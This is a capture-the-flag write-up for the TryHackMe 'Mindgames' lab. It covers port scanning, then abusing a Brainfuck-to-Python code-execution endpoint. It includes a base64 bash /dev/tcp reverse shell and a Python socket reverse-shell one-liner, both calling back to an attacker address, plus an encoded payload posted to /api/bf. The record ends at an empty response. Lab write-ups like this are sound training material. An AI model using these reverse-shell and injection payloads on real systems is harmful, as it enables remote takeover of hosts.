# Mindgames — Writeup

## Overview
### Mindgames — Writeup
### Mindgames — Writeup
----
Just a terrible idea...
----
![](https://i.imgur.com/xgHwRVs.png)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/3cc31ae64a4d42a6b5b4ab0e011859b7.png)

## Flags / Answers
- Start Machine
- No hints. Hack it. Don't give up if you get stuck, enumerate harder
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.109.15 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.109.15:22
Open 10.10.109.15:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.109.15 [2 ports]
Discovered open port 22/tcp on 10.10.109.15
Discovered open port 80/tcp on 10.10.109.15
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.109.15
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.109.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.109.15
Host is up, received user-set (0.20s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 244f06260ed37cb8184240127a9e3b71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c2b3c56fd602ff728344755d6f88dc1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da168b14aa580ee174856fafbf6b8d58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds

https://www.dcode.fr/brainfuck-language
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
print("Hello, World")

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)

for i in range(10):
    print(F(i))

intercepting with burp

Request:

POST /api/bf HTTP/1.1

Host: 10.10.109.15

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.109.15

Content-Length: 947

Connection: close

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.

Response:

HTTP/1.1 200 OK

Date: Wed, 12 Apr 2023 00:01:37 GMT

Content-Length: 24

Content-Type: text/plain; charset=utf-8

Connection: close

1
1
2
3
5
8
13
21
34
55

so let's get a revshell

  File "<string>", line 1
    L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMTkuMTAzLzEzMzggMD4mMQ==
                                                                   ^
SyntaxError: invalid syntax 

we get error in %,==,/

https://highon.coffee/blog/reverse-shell-cheat-sheet/

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

https://www.splitbrain.org/_static/ook/

Request:
POST /api/bf HTTP/1.1

Host: 10.10.109.15

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.109.15

Content-Length: 4406

Connection: close

+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++.+ +++++ +++.- ----. <+++[

->--- <]>-- -.+++ ++++. -.<++ +++++ +[->- ----- --<]> ----- ----- ----.

<+++[ ->+++ <]>++ ++.<+ +++++ +[->+ +++++ +<]>+ ++++. <++++ ++++[ ->---

----- <]>-- -.+++ ++++. <++++ ++++[ ->+++ +++++ <]>++ .++++ .+++. -.+++

.++.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++

.---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.< +++[- >+++< ]>+++ +++.<

+++++ +++[- >---- ----< ]>--- ----- .<+++ +++++ [->++ +++++ +<]>+ +++++

+.++. <++++ [->-- --<]> ---.< +++[- >+++< ]>+++ ++.++ .---. <+++[ ->---

<]>-- -.++. <+++[ ->+++ <]>++ +++.. <++++ ++++[ ->--- ----- <]>-- -----

.<+++ +++++ [->++ +++++ +<]>+ ++.++ ++.<+ +++++ +[->- ----- -<]>- -----

-.<++ +++++ [->++ +++++ <]>++ +++++ .<+++ ++++[ ->--- ----< ]>--- --.<+

+++++ +[->+ +++++ +<]>+ ++++. ----. <+++[ ->--- <]>-- -.+++ +++++ .----

--.<+ ++[-> +++<] >++++ ++.<+ +++++ ++[-> ----- ---<] >---- --.<+ +++++

++[-> +++++ +++<] >++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----.

<+++[ ->+++ <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- .<+++

+++++ [->++ +++++ +<]>+ +++++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++

+.--- ---.< +++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.<

++++[ ->+++ +<]>+ ++.++ +++.< +++++ [->++ +++<] >.<++ ++[-> ----< ]>---

---.+ ++++. ----- ----. <+++[ ->+++ <]>++ ++++. <++++ ++[-> ----- -<]>-

---.< +++++ +++[- >++++ ++++< ]>+++ ++++. ----. <+++[ ->--- <]>-- -.+++

+++++ .---- --.<+ ++[-> +++<] >++++ ++.<+ +++++ ++[-> ----- ---<] >----

--.<+ +++++ [->++ ++++< ]>+.- ---.< +++[- >---< ]>--- .++++ ++++. <++++

[->++ ++<]> ++++. <+++[ ->--- <]>-- -.+.- -.<++ +[->- --<]> ----. ----.

<+++[ ->+++ <]>++ +.<++ ++++[ ->--- ---<] >.<++ ++[-> ++++< ]>++. <++++

+++[- >++++ +++<] >++++ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++

+[->+ +++++ +<]>+ +++.< +++[- >+++< ]>+++ .-..- ----- ---.- -.<++ ++[->

++++< ]>+.< +++++ +++[- >---- ----< ]>--- ----- ----. .---- --.<+ ++[->

+++<] >++++ ++.-. --.<+ ++[-> +++<] >+.<+ ++[-> ---<] >-.++ +.+++ +++++

.<+++ [->-- -<]>- -.+++ .-.++ +.<++ ++[-> ----< ]>-.< +++[- >+++< ]>+.+

++++. ++..+ ++++. <+++[ ->--- <]>-- ----. .<+++ +[->+ +++<] >++.< +++++

++[-> +++++ ++<]> +++.+ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++

+[->+ +++++ +<]>+ ++++. <++++ [->++ ++<]> +.--- --.<+ +++++ +[->- -----

-<]>- ----- ----- --.<+ ++[-> ---<] >-.<+ +++++ ++[-> +++++ +++<] >++++

+++++ ++.<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++ +++++ <]>++

+++++ .+++. +++.- ----- -.+++ +++++ +.+.< +++++ +++[- >---- ----< ]>---

----. +.+++ .++++ .---- ---.< ++++[ ->+++ +<]>+ +.<++ +++[- >---- -<]>-

-.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ .++++ .<+++ +++++ [->--

----- -<]>- ----. <++++ +++[- >++++ +++<] >++++ +.<++ ++[-> ++++< ]>+.-

----. <++++ +++[- >---- ---<] >---- ----- ----. <+++[ ->--- <]>-. <++++

++++[ ->+++ +++++ <]>++ +++++ ++++. <++++ ++++[ ->--- ----- <]>-- ---.<

+++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++ .---- ---.+ +++++ +++.+ .<+++

+++++ [->-- ----- -<]>- ----- -.+.+ ++.++ +++.- ----- --.<+ +++[- >++++

<]>++ .<+++ ++[-> ----- <]>-- .<+++ +++++ [->++ +++++ +<]>+ +++++ +++++

++++. ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>

+++++ .<+++ +[->+ +++<] >+.-- ---.< +++++ ++[-> ----- --<]> ----- -----

---.< +++[- >---< ]>-.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++.< +++++

+++[- >---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+ +++++ +.+++ .+++.

----- --.++ +++++ ++.+. <++++ ++++[ ->--- ----- <]>-- ----- .+.++ +.+++

+++.- ----- ---.< ++++[ ->+++ +<]>+ +.<++ +++++ [->++ +++++ <]>++ ++.<+

+++++ +[->- ----- -<]>- -.<++ +++++ [->++ +++++ <]>++ +++.+ +.<++ ++[->

----< ]>--- .<+++ [->++ +<]>+ ++++. ++.-- -.<++ +[->- --<]> ---.+ +.<++

+[->+ ++<]> +++++ ..<++ +++++ +[->- ----- --<]> ----- .<+++ ++++[ ->+++

++++< ]>+++ +.--. <+++[ ->+++ <]>++ ..<++ +++++ +[->- ----- --<]> ----.

<++++ +++[- >++++ +++<] >++.< +++++ ++[-> ----- --<]> ----- ---.< +++[-

>+++< ]>+++ +.<++ +++++ [->++ +++++ <]>++ .++++ +++.+ ++++. <++++ +++[-

>---- ---<] >---- ----- ----- .<+++ ++++[ ->+++ ++++< ]>++. -.<++ ++[->

++++< ]>++. <+++[ ->--- <]>-- .<+++ +++++ [->-- ----- -<]>- ----- .<+++

[->++ +<]>+ .<+++ [->-- -<]>- .<+++ [->++ +<]>+ +.<++ +++++ [->++ +++++

<]>++ +++++ ++++. <++++ ++++[ ->--- ----- <]>-- ----- .<+++ ++++[ ->+++

++++< ]>+++ +++++ ++.<+ +++++ +[->- ----- -<]>- --.<+ +++[- >++++ <]>++

.<+++ +[->- ---<] >---- .<

Response:
HTTP/1.1 200 OK

